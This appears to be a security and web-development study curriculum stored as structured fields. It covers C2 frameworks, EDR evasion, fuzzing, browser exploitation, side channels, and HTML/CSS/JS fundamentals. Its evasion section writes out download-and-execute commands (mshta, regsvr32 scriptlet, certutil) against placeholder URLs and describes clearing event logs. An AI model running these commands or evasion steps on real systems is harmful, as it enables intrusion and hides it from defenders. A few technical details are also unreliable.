**C2 Framework overview**: red team operations use a C2 (Command and Control) framework for persistent, interactive access. **Sliver** (open source, BishopFox) supports mTLS, HTTP/S, DNS, and WireGuard implants with dynamic code generation. **Havoc** (open source) has a sleek operator UI and shellcode implants. **Cobalt Strike** (commercial, most widely deployed by real APTs) has a mature ecosystem and is extensively emulated by defenders for detection testing. The implant (agent/beacon) connects to team servers; operators issue commands; the team server aggregates sessions.

**MITRE ATT&CK** provides a structured taxonomy of adversary tactics and techniques observed in real intrusions. Tactics (columns): Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. Each technique has a T-number (T1055: Process Injection), sub-techniques (T1055.001: DLL Injection), detection suggestions, and mitigation guidance. **Purple teaming**: red team executes specific ATT&CK techniques while blue team measures their detection coverage - revealing gaps to close.

subtopics.title: EDR Evasion and OPSEC
body: **EDR (Endpoint Detection and Response)** products (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black) use kernel callbacks, ETW (Event Tracing for Windows), and behavioral analysis to detect attacker activity. They hook user-mode APIs (`CreateProcess`, `VirtualAlloc`, `WriteProcessMemory`), instrument kernel events (process creation, DLL loads, network connections), and run behavioral ML models. Evading EDR requires either operating outside the hooks, defeating the detection logic, or avoiding behaviors the models flag.

**Unhooking**: EDRs hook user-mode APIs by overwriting the first bytes of functions in `ntdll.dll` (and other DLLs) with a JMP to the EDR's analysis code. An attacker can bypass this by: (1) Loading a fresh copy of `ntdll.dll` directly from disk (before the EDR modifies it in memory); (2) Restoring the original bytes by reading `ntdll.dll` from disk and writing them back over the hooked version; (3) Calling syscalls directly (bypassing user-mode hooks entirely) via **direct syscalls** or **indirect syscalls** - emitting the syscall stub (`mov eax, syscall_number; syscall`) without going through `ntdll`.

**Process injection OPSEC**: creating remote threads (`CreateRemoteThread`) is a classic detection signature. Alternatives: **Process Hollowing** (spawn legitimate process suspended, hollow out its image, replace with malicious code, resume); **Process Doppelganging** (use NTFS transactions to overwrite a legitimate file image, map it as a process, abandon the transaction - the file on disk is never modified); **APC injection** (queue an Asynchronous Procedure Call to a thread in an existing process via `QueueUserAPC`); **Ghostwriting** - write shellcode to a non-suspicious section of an existing process without creating a new thread.

**Living off the Land (LotL)**: use tools built into Windows to perform attacker actions, blending with normal administrative activity. Examples: `mshta.exe` (runs HTA/VBScript from URL), `regsvr32.exe /s /n /u /i:http://...scrobj.dll` (runs COM scriptlet, no proxy bypass needed), `certutil.exe -urlcache -f http://... payload.exe` (downloads file via BITS), `wmic.exe process call create` (process execution), `powershell.exe -enc <Base64>` (obfuscated PowerShell execution). These blend in because `mshta.exe` is signed by Microsoft and commonly used legitimately.

**OPSEC (Operational Security)**: minimizing the forensic and detection footprint of red team activity. Key principles: (1) avoid touching disk when possible (in-memory execution, reflective DLL loading); (2) use encrypted C2 channels (malleable C2 profiles mimicking legitimate traffic - Cobalt Strike's HTTP beaconing mimics Amazon S3, CDN patterns); (3) avoid high-frequency beaconing (jitter randomizes callback intervals); (4) clean up artifacts after use (delete files, clear event logs with `wevtutil`); (5) use infrastructure that blends in (categorized domains, valid SSL certs, shared hosting IP ranges that allowlists don't block). The red team should operate as if their TTPs will be reconstructed from logs after the engagement.

resources.label: Red Team Operations with Cobalt Strike
Hacking the Art of Exploitation - AD chapters

connections.note: Kerberos is built on the network fundamentals covered there
Kerberos ticket encryption uses RC4 (NTLM hash) or AES-256; cracking depends on crypto primitives
Enterprise malware (ransomware gangs) uses AD lateral movement for pre-ransomware propagation
C2 implant development requires binary packing and anti-analysis knowledge

topics.title: Vulnerability research, fuzzing & symbolic execution
body: The frontier: coverage-guided **fuzzing** (AFL++, libFuzzer, structure-aware), **symbolic/concolic execution** (angr) for automated bug discovery, browser exploitation (V8 JIT type confusion, sandbox escape), hardware side-channels, and formal protocol verification (ProVerif/Tamarin).
This is how 0-days are found systematically rather than by luck.

subtopics.title: Coverage-Guided Fuzzing with AFL++ and libFuzzer
body: **Fuzzing** generates mutated inputs and feeds them to a program, watching for crashes (memory safety violations, assertion failures, sanitizer reports). **Coverage-guided fuzzing** instruments the binary at compile time to track which code paths each input exercises. When a mutated input reaches a new basic block (not seen before), it's added to the corpus as an 'interesting' input for further mutation. This feedback loop guides the fuzzer toward unexplored code without the randomness of blind fuzzing.

**AFL++ (American Fuzzy Lop++)** is the dominant open-source coverage-guided fuzzer. Workflow: (1) Compile target with AFL++ instrumentation (`afl-clang-fast++ target.cpp -o target`); (2) Prepare a seed corpus of valid inputs (`mkdir seeds && echo 'test' > seeds/1`); (3) Run: `afl-fuzz -i seeds -o findings -- ./target @@`. AFL++ mutates inputs (bit flips, byte substitutions, dictionary splice, havoc stage with random combinations) and tracks coverage. The `findings/crashes/` directory accumulates inputs that caused crashes - each is a potential vulnerability.

**libFuzzer** (LLVM) is library-based: instead of fuzzing a full binary, you write a **fuzz target** function `LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size)` that parses `Data` using the library under test. libFuzzer runs this function in-process (no fork overhead), making it ~100x faster than AFL for some targets. Integration with **AddressSanitizer (ASan)** (`-fsanitize=address,undefined`) detects heap overflows, UAF, use-of-uninitialized-memory, and UB that wouldn't cause an immediate crash - dramatically increasing bug detection sensitivity.

**Structure-aware fuzzing** defeats the limitation that naive byte mutation rarely produces valid inputs for complex parsers (image formats, PDF, network protocols). Techniques: (1) **Grammar-based generation** (AFL++'s `afl-cmin`, `grammarinator`): define the input grammar (BNF, protobuf), generate valid-structure inputs with random content; (2) **Corpus distillation**: minimize a large corpus to the smallest set that maintains coverage; (3) **Custom mutators**: AFL++ supports shared-library custom mutators (`afl_custom_mutator()`) that understand the input format; (4) **Protobuf-based fuzzing** (libprotobuf-mutator): test protocol implementations by fuzzing protobuf-serialized messages directly.

**Fuzzing at scale**: Google's **OSS-Fuzz** runs continuous fuzzing of 1000+ open-source projects on Google's infrastructure, using both AFL++ and libFuzzer. Found 10,000+ vulnerabilities since 2016. **ClusterFuzz** is Google's distributed fuzzing infrastructure. The key metric is **edges per second** (coverage-weighted throughput). Optimization: `afl-cmin` minimizes corpus to remove inputs that don't add coverage; persistent mode (`AFL_LOOP`) keeps the target in-process across inputs, removing fork() overhead; AFL++ CMPLOG mode instruments comparison instructions to generate inputs that satisfy specific byte equality checks.

resources.label: OSS-Fuzz - Continuous Fuzzing for Open Source

subtopics.title: Symbolic and Concolic Execution with angr
body: **Symbolic execution** treats program inputs as symbolic variables (mathematical unknowns) rather than concrete values. The engine tracks a **path condition** - a conjunction of constraints that must hold for execution to reach the current point. At each conditional branch (`if (x > 5)`), the engine forks two states: one adding constraint `x > 5` (true branch) and one adding `x <= 5` (false branch). At a target (crash site, assert, `win()` function), the engine calls an SMT solver (Z3) to find concrete values satisfying the accumulated constraints - producing an input that triggers the target.

**angr** is the dominant Python-based binary analysis framework with symbolic execution. Core API: `proj = angr.Project('./binary')`, `state = proj.factory.entry_state()`, `simgr = proj.factory.simgr(state)`, `simgr.explore(find=0x401234, avoid=0x401100)` - explores execution paths until it finds states that reach address `0x401234` while avoiding `0x401100`. `found_state.posix.stdin.concretize()` returns the concrete input bytes. Used heavily in CTF to automatically solve license key challenges, maze problems, and complex input-dependent paths.

**Path explosion** is the fundamental limitation: branching doubles the number of states. A program with 100 independent if-statements has 2^100 paths - infeasible to enumerate. Mitigations: (1) **Concolic execution** (concrete + symbolic) runs the program concretely with a real input, collecting the path constraints for that execution, then queries the SMT solver for inputs that would take a different branch at each decision point; (2) **Veritesting** hybridizes symbolic and concrete execution at loop boundaries; (3) **Pruning**: merge states that differ only in symbolic memory (summarization), use heuristics to prefer states closer to targets; (4) **Taint analysis** first identifies which input bytes influence a target condition, then apply symbolic execution only to those bytes.

**angr for vulnerability research**: `angr` can detect when a state reaches a `win()` function (for CTF), or more generally when symbolic memory constraints indicate a dangerous state (a symbolic value flowing into a `malloc()` size or `memcpy()` destination). Combined with CFG recovery (`proj.analyses.CFGFast()`), angr builds a call graph and data-flow summaries of a binary without running it. **Vulnerability finding**: constrain the symbolic inputs to cause `[rbp-0x8]` to contain an attacker-controlled value, then query for satisfying inputs.

**SAGE (Microsoft)** and **KLEE** are production symbolic execution tools. KLEE (LLVM-based) operates on LLVM bitcode, enabling deeper analysis with better coverage than binary-level analysis. SAGE powered a decade of Microsoft's internal product fuzzing by using concolic execution to generate inputs that cover new code paths from existing test suites. The hybrid approach - AFL++ for broad coverage at high speed, angr/KLEE for targeted constraint solving to reach deep paths - is the state-of-the-art for industrial vulnerability research.

subtopics.title: Browser Exploitation: V8 JIT and Sandbox Escape
body: Modern browsers are among the most complex and security-sensitive software. The attack surface is enormous: HTML/CSS parsing, JavaScript JIT compilation, WebGL/WebGPU, WebAssembly, network protocols, media decoders. The security model is **sandboxing**: the renderer process (running page JS) is sandboxed with OS mechanisms (Seccomp-BPF on Linux, AppContainer on Windows) and can only communicate with the privileged browser process via a restricted IPC channel. A full browser compromise typically requires two vulnerabilities: a **renderer bug** (code execution in the sandbox) plus a **sandbox escape** (IPC vulnerability or kernel exploit to escape the sandbox).

**V8 JIT type confusion** is historically the dominant bug class. V8 (Chrome's JS engine) compiles hot JS functions to native code via a multi-tier JIT (Ignition interpreter → Sparkplug → Maglev → TurboFan). TurboFan performs **speculative optimization**: if a property `x.a` is always observed to be a `Smi` (small integer), TurboFan compiles a version assuming it's always Smi, adding a **deoptimization guard**. A type confusion occurs when TurboFan's type inference believes a value is type A, but at runtime it's type B - if the guard is wrong or missing, the JIT code operates on type B data with type A's layout assumptions, corrupting memory.

**Exploit primitive from type confusion**: V8 represents JS objects as C++ objects with a `Map` (hidden class) pointer describing their layout. A type confusion between `JSObject` (user-controlled data) and `JSFunction` (has a `code` pointer to native code) allows reading the `code` pointer of a function and redirecting it to shellcode. More commonly: type confusion between a `JSTypedArray` and `JSArrayBuffer` - the `TypedArray`'s `backing_store` pointer (interpreted from a data field at a known offset) can be set to any address, enabling arbitrary read/write of the renderer process memory.

**V8 sandbox (2022+)**: Chrome implemented a V8 sandbox that wraps V8's heap in a 1TB reservation. V8 heap pointers are stored as 32-bit offsets from the sandbox base rather than absolute 64-bit pointers. A type confusion that achieves arbitrary write within the V8 heap can't directly write arbitrary kernel pointers - it's confined to the sandbox region. Escaping requires finding a pointer to outside the sandbox (e.g., in `Wasm.Memory`'s base pointer which references an external C++ allocation) and corrupting it. This substantially raises the bar for V8 exploitation.

**Sandbox escape techniques**: the browser IPC surface (Mojo in Chrome) exposes hundreds of interfaces from the sandboxed renderer to the privileged browser process. Each interface is a potential sandbox escape: send a malformed IPC message that causes a buffer overflow, UAF, or type confusion in the browser process. **GPU process** exploitation: the GPU process (less sandboxed, needs GPU access) processes WebGL commands; CVE-2022-1096 (Chrome zero-day, exploited in the wild) was a V8 type confusion; CVE-2021-21166 was a UAF in the browser process's audio component triggered via IPC from the renderer.

subtopics.title: Hardware Side-Channel Attacks: Spectre and Meltdown
body: **Side-channel attacks** exploit physical or micro-architectural properties of hardware rather than logical flaws in software. The CPU is a physical system with timing, power, electromagnetic emissions, and acoustic signatures that leak information about computation. **Cache timing** is the most exploited: cache hits (data already in L1/L2) complete in ~4 cycles; cache misses (fetching from RAM) take ~200 cycles. An attacker who can time memory accesses can determine whether a specific cache line is hot or cold - recovering which addresses were recently accessed by a victim process.

**Meltdown (CVE-2017-5754)**: exploits out-of-order execution to read kernel memory from user space. The CPU speculatively executes instructions before completing security checks. Attacker code: (1) speculatively reads `kernel_memory[offset]`; (2) uses the byte value to index a user-space array: `probe_array[secret_byte * 4096]`. The security check then raises #PF and rolls back the speculative read - but the cache line at `probe_array[secret_byte * 4096]` remains cached. A timing probe of all 256 cache lines reveals which index was accessed, recovering `secret_byte`. Mitigated by **KPTI (Kernel Page Table Isolation)**: separates kernel and user page tables, incurring a TLB flush on every syscall.

**Spectre (CVE-2017-5753, 5715)**: trains the CPU's branch predictor to speculatively execute an out-of-bounds array access. The attacker mistrain the branch predictor on the pattern `if (x < array.length) access(array[x])` by calling with valid x many times. Then call with `x = secret_offset` - the branch predictor speculatively executes the access even though `x >= array.length`. The speculative access leaks `array[secret_offset]` via a cache side-channel. Unlike Meltdown, Spectre crosses the **trust boundary** between processes and even within the same process (JIT engines). Mitigation requires **retpoline** (prevents indirect branch speculation), `lfence` barriers, and architecture changes (eIBRS).

**Flush+Reload** is the core cache side-channel technique: (1) Flush a cache line (`clflush`); (2) Wait for the victim to potentially access it; (3) Reload (time the access) - cache hit means the victim accessed it, cache miss means they didn't. This enables recovering AES key bytes (if the victim uses a table-based AES implementation, each encryption access pattern leaks key-dependent byte values), recovering RSA private key bits (timing modular exponentiation), and breaking address-space isolation.

**Rowhammer**: a DRAM-level attack exploiting physical coupling between adjacent memory rows. Repeatedly reading ('hammering') the same DRAM row within a refresh interval causes bit flips in physically adjacent rows. **rowhammer.js** demonstrated bit flipping from JavaScript. **RAMBleed** extends this to reading secret values via differential bit-flip analysis. **Rowhammer for LPE**: flip a bit in a page table entry, changing a user-writable page to map to a kernel page - enabling arbitrary kernel memory write. Mitigated by **Target Row Refresh (TRR)** in LPDDR4+ and ECC memory (detects but doesn't always correct multi-bit flips).

subtopics.title: Formal Protocol Verification with ProVerif and Tamarin
body: **Formal verification** applies mathematical proof to security protocols: rather than testing specific attacks, it proves (or disproves) security properties for **all possible adversary strategies** in a defined attacker model. This is the only way to establish that a protocol is secure in principle, before implementation bugs are considered. Significant real-world impact: formal verification found flaws in TLS 1.2, EMV card protocols, Signal, and OAuth - before those protocols were widely deployed.

**Dolev-Yao attacker model**: the standard adversary assumption for symbolic protocol verification. The attacker controls the entire network: can intercept, modify, replay, and inject messages. The attacker cannot break cryptographic primitives (perfect cryptography assumption) - they can't decrypt without the key, can't forge signatures, can't invert hash functions. This is the symbolic model: messages are algebraic terms, encryption is a function that only reverses with the correct key. Computationally sound models (Computational Complexity-based) replace this with probability-based assumptions over actual algorithms.

**ProVerif** verifies cryptographic protocols in the **applied pi calculus**. A protocol is described as concurrent processes communicating over channels; attacker knowledge is modeled as accessible channels. ProVerif proves reachability properties ('can the attacker learn the session key?') and correspondence properties ('if the server completed a session, was there a matching client session?') via resolution-based automated theorem proving. It's fully automatic - no manual proofs needed. Limitation: overapproximates (may report a false attack), works on unbounded sessions but can miss session-specific issues.

**Tamarin** verifier uses a term-rewriting formalism and can verify both **secrecy** and **authentication** properties with **equational theories** (modeling XOR, DH, bilinear pairings). Tamarin found a previously unknown attack on the Signal protocol's double ratchet in a specific multi-device scenario. The **Tamarin prover** requires writing rules as multiset rewriting rules and specifying lemmas in a temporal logic. Unlike ProVerif, Tamarin allows interactive proofs where the automated prover gets stuck - a human can supply lemmas to help it proceed.

**Impact on protocol design**: TLS 1.3's design was formally verified with TLS-Attacker (fuzzing) and miTLS/F* (formal verification) before standardization, making it arguably the most well-analyzed protocol in history. IEEE 802.11 (WPA2/3) formal verification revealed the DRAGONBLOOD attacks on WPA3-SAE before the standard was finalized for wide deployment. The lesson: formally verify before deploying, not after. For implementation-level security (not just protocol-level), use memory-safe languages or apply fuzzing + symbolic execution to the implementation itself.

resources.label: The Art of Software Security Assessment (book)

connections.note: Fuzzing and symbolic execution find bugs; RE is needed to understand and exploit them
Fuzzer-found crashes are exploited using the pwn techniques
Formal verification is the gold standard for protocol security - TLS 1.3 was formally verified
Hardware side-channels exploit CPU micro-architectural behaviors: speculative execution, cache sharing

title: Web Development
tagline: From HTML/CSS to distributed systems, performance, and production architecture.
overview: Web dev is the most-shipped discipline here, and the trap is staying at the framework surface. The real depth is in the platform (how the browser, the event loop, and HTTP actually work) and in the backend systems (databases, caching, distributed architecture) that the framework hides.

The arc: own the platform → build full-stack apps with real auth and databases → engineer performance and design systems at scale. The distributed-systems and database material here is the bridge to everything from quant infra to ML serving.

Each topic has a short overview and a **Deep dive** section of textbook-length subtopics - paired with exact deep-links to the canonical reference for each. Built for genuine mastery, not orientation.

topics.title: The web platform: HTML, CSS, the browser
body: Semantic HTML + accessibility (ARIA, screen readers), CSS the way it's actually designed (cascade, specificity, inheritance, **flexbox/grid**, `clamp()`/container queries), and the JS runtime model: **event loop**, call stack, **microtasks vs macrotasks**, DOM, and the Fetch API.
Understanding the event loop is the single concept that separates people who 'use' JS from people who reason about it.

subtopics.title: HTML semantics, accessibility, and the DOM tree
body: HTML is not a presentation language - it is a **semantic** language. Every element carries meaning that browsers, search engines, and assistive technologies consume. `<article>`, `<nav>`, `<main>`, `<section>`, `<aside>` are not CSS hooks; they are structural landmarks that screen readers use to build a navigation menu and that search engines use to weight content. Using a `<div>` for everything is not neutral - it actively removes information that accessibility tooling needs.

The browser parses HTML into the **Document Object Model (DOM)**: a tree of node objects in memory. Each HTML element becomes an `Element` node, text content becomes `Text` nodes, and attributes become properties on those nodes. Parsing is **incremental and error-correcting** - the HTML5 parser specification defines exactly how to handle malformed markup (unclosed tags, misnested elements) and browsers are required to produce identical trees regardless of errors, which is why `text` produces the same DOM in every browser. The spec literally has a state machine with ~70 states for tokenizing HTML.

**ARIA (Accessible Rich Internet Applications)** is an overlay system for when HTML semantics are insufficient - primarily for custom interactive widgets (date pickers, comboboxes, tree views) that have no native HTML equivalent. The key roles: `role='button'` makes a div behave like a button in the accessibility tree, `aria-expanded` communicates open/closed state, `aria-live` marks regions that update dynamically and should be announced. The golden rule is **use the native element first** - a `<button>` is focusable, activatable by keyboard, and announced correctly for free; an ARIA-patched `<div>` requires you to reimplement all of that. ARIA does not affect rendering or behavior - it is purely metadata for assistive technology.

**Focus management** is what separates accessible interactive UIs from inaccessible ones. Every interactive control must be reachable by Tab, activatable by Enter/Space, and must have a visible focus indicator (removed in many CSS resets - `outline: none` without a replacement is an accessibility violation). The `tabindex` attribute controls focus order: `0` means participates in natural document order, `-1` means focusable by script only (useful for managing focus inside modals), and positive values create a separate ordered sequence (generally avoid). Modal dialogs require **focus trapping** - while a modal is open, Tab must cycle only within it, and focus must return to the trigger element when the modal closes.

The DOM is not just a tree - it is a **live object graph**. `document.getElementById` returns a reference; if the element is removed from the document, that reference becomes detached but still holds all its properties and children in memory. `querySelectorAll` returns a **static NodeList** (a snapshot), while `getElementsByClassName` returns a **live HTMLCollection** that updates automatically when the DOM changes - iterating a live collection while mutating it is a classic source of off-by-one bugs. DOM mutations are **synchronous**: calling `element.appendChild(child)` immediately modifies the live tree and the change is visible to subsequent JS in the same task; rendering (painting pixels) is deferred until the browser gets control back after the current task. This is why you can read `offsetHeight` after setting innerHTML and see the computed layout value - the browser does synchronous layout (a **forced reflow**) when you query layout properties.

A practical exercise: build a custom accessible modal from scratch using only a `<div>` and `<button>`, handling: `role='dialog'`, `aria-modal`, `aria-labelledby`, focus trap on Tab, Escape to close, focus return to trigger. This exercise covers more of the accessibility model in one sitting than a month of reading.

resources.label: WAI-ARIA Authoring Practices 1.2 - patterns with working code

subtopics.title: CSS cascade, specificity, inheritance, and the visual formatting model
body: CSS is formally specified as a set of algorithms, not a set of rules about styling. Understanding the algorithms is what makes CSS predictable instead of magical. The three core algorithms are the **cascade**, **specificity**, and **inheritance** - and they run in sequence every time the browser computes a property value.

**Specificity** is a vector, not a number, though it is often written as one. It has four components: `(inline styles, IDs, classes/attributes/pseudo-classes, elements/pseudo-elements)`. The vector is compared lexicographically: a single ID beats any number of classes (`0-1-0-0` vs `0-0-100-0`). The common mistake is chasing specificity with more selectors when the correct fix is restructuring HTML or using `@layer`. **`!important`** does not increase specificity - it creates a parallel 'important' cascade origin that wins over all normal declarations. Overriding `!important` requires your own `!important` declaration with higher specificity - a spiral that is the origin of the 'specificity war' antipattern.

**The cascade** is the tiebreaker after specificity. It considers: (1) origin (user-agent stylesheet vs author stylesheet vs user stylesheet), (2) importance (`!important` flips the origin order), (3) `@layer` order (declarations in later layers win, unlayered styles win over all layers), (4) specificity, and (5) document order (last declaration wins). **`@layer`** (introduced in 2022, now universally supported) solves the specificity war: you declare layer priority once (`@layer base, components, utilities`) and anything in `utilities` automatically wins over `components` regardless of selector specificity. This is how Tailwind's `@layer utilities` works under the hood.

**Inheritance** flows *down* the DOM tree for a specific set of properties that are semantically about text and reading: `color`, `font-family`, `font-size`, `line-height`, `text-align`, `cursor`, etc. Layout properties (`width`, `margin`, `padding`, `display`) are **not** inherited. The keywords `inherit`, `initial`, `unset`, and `revert` give explicit control: `inherit` forces inheritance regardless of the property's default, `initial` resets to the spec default (often not what you want), `unset` inherits if the property is normally inherited, otherwise resets to initial, and `revert` rolls back to the browser's user-agent stylesheet.

**The visual formatting model** is how CSS actually places elements. Each element generates one or more boxes, and their type is controlled by `display`. `block` boxes stack vertically, stretch to fill their containing block's width, and participate in **block formatting contexts (BFC)**. `inline` boxes flow like text. `inline-block` flows like text but accepts width/height. Creating a new **BFC** (via `overflow: hidden`, `display: flow-root`, `contain: layout`) is the mechanism that makes a container 'contain' its floated children and prevents margin collapse between a parent and its first/last child. Margin collapse - where adjacent vertical margins merge to the larger of the two - is the most common source of 'my margins are not adding up' confusion. It only occurs between **block** margins, only in the **block direction**, and only when no BFC boundary separates them.

The **box model** computation: `content-box` (default) means `width` sets the content area; padding and border are added outside. `border-box` means `width` includes padding and border - almost every production codebase resets to `box-sizing: border-box` globally because it makes mental arithmetic obvious. The `margin` is always outside the border regardless of box-sizing mode, and it does not affect the element's own size computation. **Stacking contexts** are the third axis: `z-index` only has meaning within a stacking context, and a new stacking context is created by `position` (not static) with `z-index` not auto, `opacity < 1`, `transform`, `filter`, `will-change`, and several others. Two elements in different stacking contexts cannot be interleaved by `z-index` - a `z-index: 9999` inside a stacking context with `z-index: 1` cannot paint above an element in a sibling stacking context with `z-index: 2`.

resources.label: Josh Comeau - Understanding the CSS Box Model
CSS Tricks - A Complete Guide to the CSS Cascade

subtopics.title: Flexbox and CSS Grid - the layout engines
body: Before Flexbox and Grid, web layout was a collection of hacks layered on a system designed for documents, not UIs: floats (intended for text reflow around images), tables (meant for tabular data), absolute positioning (removes elements from flow entirely). Flexbox and Grid are the first layout systems in CSS designed from the ground up for UI composition.

**Flexbox** operates in one dimension at a time. The **main axis** is the direction of flex item flow (horizontal for `flex-direction: row`, vertical for `flex-direction: column`). The **cross axis** is perpendicular. `justify-content` distributes space along the main axis; `align-items` aligns items along the cross axis; `align-content` distributes multiple rows/columns along the cross axis (only relevant with `flex-wrap: wrap`). The `flex` shorthand is `flex-grow flex-shrink flex-basis`: `flex-grow` controls how much a flex item grows relative to siblings when there is extra space; `flex-shrink` controls how much it shrinks when space is scarce; `flex-basis` sets the initial size *before* growth/shrinkage. `flex: 1` means `1 1 0` - start at zero size and grow/shrink proportionally. `flex: auto` means `1 1 auto` - start at the item's content size and grow/shrink from there. The difference is crucial for equally-sized items: `flex: 1` produces equal sizes; `flex: auto` produces sizes proportional to content.

**CSS Grid** operates in two dimensions simultaneously. You define the track structure with `grid-template-columns` and `grid-template-rows`, either explicitly (exact sizes) or with the `fr` unit (fractional share of remaining space) or `repeat()`. `repeat(auto-fill, minmax(200px, 1fr))` is the canonical responsive grid: as many columns as fit at minimum 200px, each stretching to fill the row equally - no media queries needed. Items are placed into grid cells automatically or explicitly with `grid-column: 2 / 4` (span from line 2 to line 4) or `grid-area: header`. **Named areas** (`grid-template-areas`) let you define a visual ASCII representation of the layout in CSS and place elements into named regions - this is genuinely the most readable way to implement page layouts.

The decision between Flexbox and Grid is about layout intent, not capability. **Flexbox** is the right tool when the layout is *content-driven* - the size of items determines the layout. Navigation bars, button groups, card rows where wrapping is fine: Flexbox. **Grid** is the right tool when the layout is *container-driven* - you want items to conform to a predetermined grid structure regardless of content size. Page layouts, image galleries, dashboards: Grid. The common pattern is Grid for macro layout (page regions) and Flexbox for micro layout (within each region).

**`clamp(min, preferred, max)`** is the missing piece for fluid typography and spacing. `font-size: clamp(1rem, 4vw, 1.5rem)` means: never smaller than 1rem, never larger than 1.5rem, but linearly interpolate via the viewport width in between - zero media queries for responsive type. **Container queries** (`@container`) are the game-changer: they let you apply styles based on the size of a *component's parent container* rather than the viewport. A card component can have different layouts when it is in a narrow sidebar vs a wide main area without any external coordination. This finally makes components truly self-contained - the component holds its own responsive logic.

The `gap` property (formerly `grid-gap`) works in both Flexbox and Grid and is the correct way to space items - not margins, which interact with the box model and require negative-margin hacks to counteract on the container. Subgrid (`grid-template-columns: subgrid`) lets a nested grid inherit track definitions from an ancestor grid, solving the classic problem of aligning fields inside cards that are themselves in a grid.

resources.label: Josh Comeau - An Interactive Guide to Flexbox

subtopics.title: The JavaScript event loop, microtasks, and macrotasks
body: JavaScript is single-threaded - there is one call stack, one heap, and one event loop per browser tab (ignoring Web Workers). This is a deliberate design: concurrent mutations to the DOM would require locks everywhere. But the browser itself is multi-threaded - the renderer, network, timers, and I/O run on separate threads and communicate with the JS thread via the event loop. Understanding this handoff is everything.

The **call stack** is a LIFO stack of execution contexts. When you call a function, its frame (local variables, the return address) is pushed; when it returns, the frame is popped. Synchronous code runs top-to-bottom, pushing and popping. **Stack overflow** is a literal call stack overflow - unbounded recursion fills the stack until the browser throws. The heap is where objects live; the stack holds primitive values and references into the heap.

The **event loop** runs continuously: (1) check if the call stack is empty; (2) if yes, dequeue one **task** (macrotask) from the **task queue** and push its callback onto the stack; (3) after the task completes (stack is empty again), drain the entire **microtask queue** before returning to step 1. This means microtasks have higher priority than tasks and will run to completion before any new task begins. If a microtask queues another microtask, that runs too - microtask processing is not bounded to one item per iteration. A pathological case: a Promise `.then()` chain that never resolves and keeps queueing microtasks will starve the event loop of macrotasks indefinitely (the UI freezes).

**Macrotasks** (tasks): `setTimeout`, `setInterval`, `setImmediate` (Node), I/O callbacks, UI render steps, `postMessage`. Each timer callback is one macrotask. **Microtasks**: resolved Promise `.then()`/`.catch()`/`.finally()` callbacks, `queueMicrotask()`, `MutationObserver` callbacks. The classic demonstration: `console.log('A'); setTimeout(() => console.log('B'), 0); Promise.resolve().then(() => console.log('C')); console.log('D')` prints `A D C B` - synchronous code runs (A, D), then microtasks (C), then the next macrotask (B). The `setTimeout(..., 0)` does not mean 'run immediately' - it means 'enqueue as a macrotask after at least 0ms', and a microtask always runs first.

**`requestAnimationFrame`** is a special task that runs before the browser's next render step. It is not a macrotask in the traditional sense - it is in the render task category: after each macrotask, the browser checks if it is time to render a frame (typically every 16.67ms for 60fps), and if so runs `rAF` callbacks before painting. This makes `rAF` the correct tool for animations (never `setTimeout`), because your callback is synchronized with the display refresh rate. A long-running synchronous computation in a `rAF` callback delays the paint the same as anywhere else - the browser cannot paint mid-task.

**`async/await`** is syntax sugar over Promises. `await expr` suspends the `async` function, schedules the rest as a microtask when `expr` resolves, and returns control to the caller. The critical implication: `async` functions always return a Promise, and code after `await` always runs asynchronously (as a microtask callback) even if `expr` resolved synchronously. This is why you cannot convert an async codebase back to synchronous without removing all `async/await` - the execution model changes. A common mental model failure: `await fetch(url)` does not block - the function is suspended, the call stack unwinds, and other tasks/microtasks can run. When the network responds, the continuation is scheduled as a microtask.

resources.label: Jake Archibald - In The Loop (JSConf Asia)
resources.note: the definitive visual event loop talk

resources.label: javascript.info - Event loop: microtasks and macrotasks

subtopics.title: Web APIs: Fetch, Storage, Service Workers, and the browser security model
body: The browser is a sandboxed operating system. Each tab has its own memory space (modulo process sharing), its own JS heap, and its own set of Web API bindings. Web APIs are not JS - they are interfaces exposed by the browser to JS code via bindings. `fetch`, `localStorage`, `navigator`, `window`, `document` are all browser-provided; they are not part of the ECMAScript specification and do not exist in Node.js (without polyfills).

**`fetch`** is the modern network API, replacing `XMLHttpRequest`. It returns a Promise that resolves to a `Response` object. The critical nuance: the Promise rejects *only on network failure* (DNS resolution failure, connection refused), not on HTTP error status codes. A 404 or 500 response resolves normally with `response.ok === false`. You must explicitly check `if (!response.ok) throw new Error(response.statusText)` to treat HTTP errors as exceptions. Response bodies are streams - `response.json()`, `response.text()`, and `response.blob()` each consume the stream once and return a Promise. You cannot call both `response.json()` and `response.text()` on the same response without cloning it first via `response.clone()`.

**`localStorage`** and **`sessionStorage`** are synchronous key-value stores limited to 5-10MB per origin. Their synchronous nature is their biggest problem: `localStorage.getItem` blocks the main thread - fine for small reads, catastrophic if called in a hot loop or for large values. **`IndexedDB`** is the async, transactional, key-value store suitable for large amounts of structured data. Its API is callback-based (predating Promises) and notoriously verbose; libraries like Dexie.js wrap it in a pleasant Promise API. **`Cache API`** (used by Service Workers) caches `Request`/`Response` pairs - the correct tool for caching network responses, not general application data.

**Same-Origin Policy (SOP)** is the browser's primary security boundary: a document served from `https://a.com` cannot read responses from `https://b.com` unless `b.com` opts in. 'Same origin' means same protocol + host + port. SOP restricts `fetch`/`XMLHttpRequest` reads, not embedding - images, scripts, and iframes can be loaded cross-origin, but their content cannot be inspected. **CORS (Cross-Origin Resource Sharing)** is the opt-in mechanism: for simple requests (GET/HEAD/POST with certain content types), the browser sends an `Origin` header and grants access if the response includes `Access-Control-Allow-Origin: *` or the matching origin. For 'preflighted' requests (non-simple methods, custom headers, certain content types), the browser sends an `OPTIONS` preflight first; only on a successful preflight does it send the actual request. The common confusion: CORS errors are browser-enforced, not server-enforced - the server still receives and processes the request, it just doesn't include the right headers. A CORS error does not mean the request failed server-side.

**Service Workers** are JavaScript files that run in a separate thread from the page, acting as a programmable network proxy between the page and the network. A Service Worker intercepts `fetch` events and can respond from the Cache API (offline support), modify requests, or forward them to the network. Their lifecycle is intentional: `install` (runs once on first registration), `activate` (runs after old service worker is gone - use this to clean old caches), `fetch` (intercepts every request from pages the worker controls). Service Workers are the basis for Progressive Web Apps (PWAs), background sync (`SyncManager`), and push notifications (`PushManager`). The key security restriction: Service Workers require HTTPS (or localhost). They cannot access the DOM directly but can communicate with pages via `postMessage` and `BroadcastChannel`.

